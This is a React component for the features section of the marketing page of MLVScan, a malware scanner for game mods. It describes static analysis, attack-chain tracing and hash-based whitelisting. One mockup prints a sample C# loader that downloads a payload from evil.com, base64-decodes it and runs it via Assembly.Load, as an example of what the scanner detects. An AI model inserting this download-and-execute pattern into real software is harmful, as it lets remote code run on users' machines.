import {
  ScanSearch,
  GitBranch,
  ShieldCheck,
  Monitor,
  ShieldAlert,
  Terminal,
  Lock,
  Network,
  Code2,
  FileCode,
  ChevronRight,
  Puzzle,
  TerminalSquare,
  Cpu,
  Server,
  CheckCircle2,
  Zap,
  Layers,
  AlertTriangle,
  Eye
} from "lucide-react"

const FEATURE_CARDS = [
  {
    icon: ScanSearch,
    title: "Checks Mods Safely",
    description: "Reads mod files without running them, so threats can be caught before anything executes."
  },
  {
    icon: GitBranch,
    title: "Spots Hidden Attack Chains",
    description: "Connects downloads, file drops, and launch behavior even when malware splits the steps across different functions."
  },
  {
    icon: ShieldCheck,
    title: "Catches Common Malware Tricks",
    description: "Flags suspicious behavior like stealthy downloads, hidden launches, encoded payloads, and more."
  },
  {
    icon: Monitor,
    title: "Runs On Your Device",
    description: "The web scanner works entirely in your browser, so your files do not leave your machine."
  }
]

const PLATFORMS = [
  { name: "MelonLoader", icon: Puzzle },
  { name: "BepInEx 5", icon: TerminalSquare },
  { name: "BepInEx 6 Mono", icon: Cpu },
  { name: "BepInEx 6 IL2CPP", icon: Server },
]

const Features = () => {
  return (
    <section id="features" className="relative py-32 px-4 overflow-hidden">
      <div className="container mx-auto max-w-6xl space-y-24">

        {/* Section Header */}
        <div className="text-center max-w-2xl mx-auto">
          <h2 className="text-3xl md:text-4xl font-bold mb-6">
            How MLVScan <span className="gradient-text">Protects You</span>
          </h2>
          <p className="text-lg text-muted-foreground leading-relaxed">
            Scan mods before you install them and catch dangerous behavior before the game ever loads it.
          </p>
        </div>

        {/* Tier 1: At-a-Glance Feature Cards */}
        <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
          {FEATURE_CARDS.map((feature, i) => (
            <div
              key={i}
              className="rounded-2xl border border-white/10 bg-white/5 p-6 transition-all duration-300"
            >
              <div className="relative">
                <feature.icon className="w-8 h-8 text-teal-400 mb-4" />
                <h3 className="text-lg font-bold mb-2 text-foreground">{feature.title}</h3>
                <p className="text-sm text-muted-foreground leading-relaxed">{feature.description}</p>
              </div>
            </div>
          ))}
        </div>

        {/* Tier 2: Deep-Dive Row 1 - IL Analysis */}
        <div className="grid lg:grid-cols-2 gap-16 items-center">
          {/* Left: Code Mockup */}
          <div className="order-2 lg:order-1 relative">
            <div className="relative rounded-2xl border border-white/10 bg-black/50 backdrop-blur-md p-6 overflow-hidden">
              {/* Finding Header */}
              <div className="flex items-center gap-2 border-b border-white/10 pb-4 mb-4">
                <ShieldAlert className="w-5 h-5 text-red-400" />
                <span className="font-mono text-sm font-bold text-red-400">DETECTED: Hidden Code Loader</span>
              </div>

              {/* IL Code Snippet */}
              <div className="font-mono text-xs space-y-2 text-muted-foreground mb-4">
                <p><span className="text-purple-400">void</span> <span className="text-yellow-200">LoadPayload</span>() {"{"}</p>
                <p className="pl-4"><span className="text-blue-300">var</span> client = <span className="text-blue-300">new</span> WebClient();</p>
                <p className="pl-4"><span className="text-blue-300">var</span> data = client.DownloadData(<span className="text-green-300">"https://evil.com/payload.bin"</span>);</p>
                <p className="pl-4"><span className="text-blue-300">var</span> decoded = Convert.FromBase64String(data);</p>
                <div className="pl-4 py-2 bg-red-500/10 border-l-2 border-red-500/50 my-2">
                  <span className="text-red-300">Assembly.Load(decoded);</span>
                </div>
                <p>{"}"}</p>
              </div>

              {/* Finding Annotation */}
              <div className="rounded-lg border border-red-500/20 bg-red-500/5 p-3">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs font-bold text-red-400 uppercase tracking-wide">Hidden code loading</span>
                  <span className="text-xs font-bold px-2 py-0.5 rounded-full bg-red-500/20 text-red-400 border border-red-500/30">Critical</span>
                </div>
                <div className="flex items-center gap-2 text-xs text-muted-foreground">
                  <AlertTriangle className="w-3 h-3 text-amber-400" />
                  <span>Suspicious combo: download + decoding + loading extra code</span>
                </div>
              </div>
            </div>
          </div>

          {/* Right: Explanation */}
          <div className="order-1 lg:order-2">
            <h3 className="text-2xl font-bold mb-4 text-foreground flex items-center gap-3">
              <span className="flex items-center justify-center w-8 h-8 rounded-full bg-red-500/10 text-red-500 text-sm font-bold">1</span>
              See What Code Will Do Before It Runs
            </h3>
            <p className="text-lg text-muted-foreground mb-6 leading-relaxed">
              Most mod loaders blindly execute whatever DLL you drop in. Suspicious mods can steal tokens or install ransomware the moment the game starts.
            </p>
            <div className="space-y-4">
              <div className="flex gap-4">
                <Terminal className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Safe File Inspection</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    MLVScan reads the mod file directly and estimates what the code is trying to do without running it.
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <Layers className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Looks For Risky Combinations</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    One warning sign alone is not always enough. MLVScan looks for combinations like download plus execute, hidden process launch, or encoded payloads.
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <Lock className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Built To Reduce False Positives</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    Some features like reflection can be legitimate. MLVScan weighs the surrounding behavior so normal mod code is less likely to be flagged by mistake.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Tier 2: Deep-Dive Row 2 - Attack Chain Detection */}
        <div className="grid lg:grid-cols-2 gap-16 items-center">
          {/* Left: Explanation */}
          <div>
            <h3 className="text-2xl font-bold mb-4 text-foreground flex items-center gap-3">
              <span className="flex items-center justify-center w-8 h-8 rounded-full bg-teal-500/10 text-teal-500 text-sm font-bold">2</span>
              Trace Entire Attack Chains
            </h3>
            <p className="text-lg text-muted-foreground mb-6 leading-relaxed">
              Modern malware often hides each step in a different part of the file. MLVScan connects those steps so the full threat is still visible.
            </p>
            <div className="space-y-4">
              <div className="flex gap-4">
                <GitBranch className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Follows Where Code Leads</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    Starts from common mod entry points and follows the path into the suspicious parts of the file.
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <Network className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Tracks What Happens To Downloaded Data</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    It can catch split attacks where one function downloads something, another writes it to disk, and another launches it.
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <Zap className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Recognizes Reused Malware Patterns</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    Reused attacker patterns like download-and-run behavior or hidden code loading are grouped together so repeat campaigns stand out faster.
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Right: Data Flow Mockup */}
          <div className="relative">
            <div className="rounded-2xl border border-white/10 bg-black/40 backdrop-blur-md p-6">
              <div className="flex items-center justify-between mb-6">
                <span className="text-sm font-mono text-teal-400">Attack Path</span>
                <span className="text-xs font-bold px-2 py-1 rounded-full bg-teal-500/20 text-teal-300 border border-teal-500/30">
                  Confidence: 0.92
                </span>
              </div>

              {/* Flow Visualization */}
              <div className="flex items-center justify-between gap-2 mb-6">
                {/* Source Node */}
                <div className="flex-1 rounded-xl border border-teal-500/30 bg-teal-500/10 p-3 text-center">
                  <Network className="w-5 h-5 text-teal-400 mx-auto mb-2" />
                  <div className="text-xs font-bold text-teal-400">Download</div>
                  <div className="text-xs text-muted-foreground mt-1">WebClient<br />.DownloadData()</div>
                </div>

                {/* Arrow 1 */}
                <div className="flex items-center">
                  <ChevronRight className="w-5 h-5 text-teal-400" />
                </div>

                {/* Transform Node */}
                <div className="flex-1 rounded-xl border border-amber-500/30 bg-amber-500/10 p-3 text-center">
                  <Code2 className="w-5 h-5 text-amber-400 mx-auto mb-2" />
                  <div className="text-xs font-bold text-amber-400">Decode</div>
                  <div className="text-xs text-muted-foreground mt-1">FromBase64<br />.String()</div>
                </div>

                {/* Arrow 2 */}
                <div className="flex items-center">
                  <ChevronRight className="w-5 h-5 text-teal-400" />
                </div>

                {/* Sink Node */}
                <div className="flex-1 rounded-xl border border-red-500/30 bg-red-500/10 p-3 text-center">
                  <FileCode className="w-5 h-5 text-red-400 mx-auto mb-2" />
                  <div className="text-xs font-bold text-red-400">Run</div>
                  <div className="text-xs text-muted-foreground mt-1">Assembly<br />.Load()</div>
                </div>
              </div>

              {/* Pattern Badge */}
              <div className="rounded-lg border border-teal-500/20 bg-teal-500/5 p-3 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Eye className="w-4 h-4 text-teal-400" />
                  <span className="text-sm font-bold text-teal-300">Download and run</span>
                </div>
                <CheckCircle2 className="w-4 h-4 text-teal-400" />
              </div>
            </div>
          </div>
        </div>

        {/* Tier 2: Deep-Dive Row 3 - Mod Ecosystem */}
        <div className="grid lg:grid-cols-2 gap-16 items-center">
          {/* Left: Platform Cards + Whitelisting */}
          <div className="order-2 lg:order-1 relative">
            <div className="relative rounded-2xl border border-white/10 bg-black/40 backdrop-blur-md p-6">
              <h4 className="text-sm font-bold text-muted-foreground mb-4">Supported Platforms</h4>
              <div className="grid grid-cols-2 gap-3 mb-6">
                {PLATFORMS.map((platform, i) => (
                  <div
                    key={i}
                    className="flex items-center gap-3 p-3 rounded-xl border border-white/10 bg-white/5"
                  >
                    <platform.icon className="w-5 h-5 text-teal-400" />
                    <span className="text-sm font-medium text-foreground">{platform.name}</span>
                  </div>
                ))}
              </div>

              {/* Whitelisting Visual */}
              <div className="rounded-xl border border-teal-500/20 bg-teal-500/5 p-4">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs font-bold text-teal-400">Trusted Mod Fingerprint</span>
                  <CheckCircle2 className="w-4 h-4 text-teal-400" />
                </div>
                <div className="font-mono text-xs text-muted-foreground bg-black/30 rounded p-2">
                  sha256:a1b2c3d4e5f6...7g8h9i0j1k2l3
                </div>
                <p className="text-xs text-muted-foreground mt-2">
                  Trust is tied to the file itself, not just the filename, so changed copies do not inherit approval.
                </p>
              </div>
            </div>
          </div>

          {/* Right: Ecosystem Explanation */}
          <div className="order-1 lg:order-2">
            <h3 className="text-2xl font-bold mb-4 text-foreground flex items-center gap-3">
              <span className="flex items-center justify-center w-8 h-8 rounded-full bg-teal-500/10 text-teal-500 text-sm font-bold">3</span>
              Built for the Mod Ecosystem
            </h3>
            <p className="text-lg text-muted-foreground mb-6 leading-relaxed">
              Built for Schedule 1 modding and the loaders people actually use. Protection happens before a suspicious mod gets the chance to run.
            </p>
            <div className="space-y-4">
              <div className="flex gap-4">
                <ShieldAlert className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Blocks Dangerous Mods Automatically</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    If a mod looks dangerous enough, MLVScan can stop it before it loads so you do not have to catch it manually.
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <FileCode className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Lets You Trust Known-Good Mods</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    Safe mods can be approved by their unique file fingerprint, and developer mode helps explain false positives when they happen.
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <Terminal className="w-6 h-6 text-teal-400 shrink-0" />
                <div>
                  <h4 className="font-bold text-foreground">Works For Mod Developers Too</h4>
                  <p className="text-sm text-muted-foreground mt-1">
                    Developers can scan releases in scripts or GitHub Actions and catch risky behavior before shipping to players.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

      </div>
    </section>
  )
}

export default Features
